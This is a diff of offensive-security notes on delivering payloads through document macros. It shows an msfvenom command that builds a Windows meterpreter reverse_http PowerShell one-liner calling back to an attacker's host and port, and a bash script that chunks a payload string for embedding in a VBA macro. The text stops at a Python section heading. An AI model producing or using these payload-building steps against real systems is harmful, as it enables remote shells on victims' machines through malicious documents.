@@ -1,12 +1,35 @@
 # Payload Delivery
 
-## 01 - Macros
+## 01 - Macro Scripts
 
-### 1.1 - Crafting Manually
-
-#### 1.1.1 - Scripts
+- Generate a powershell one liner.
 
 `$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=<PORT> -f psh-cmd`
+
+### 1.1 - Bash
+
+`$ cat vba-macro-payload-format.sh`
+
+---
+
+```bash
+#!/bin/bash
+
+string=""
+chunks=50
+
+for ((i=0; i<${#string}; i+=chunks))
+do
+    if [[ i -eq 0 ]]
+    then
+        echo "string=\"${string:i:chunks}\""
+    else
+        echo "string+=\"${string:i:chunks}\""
+    fi
+done
+```
+
+### 1.2 - Python
 
 `$ cat vba-macro-payload-format.py`
 
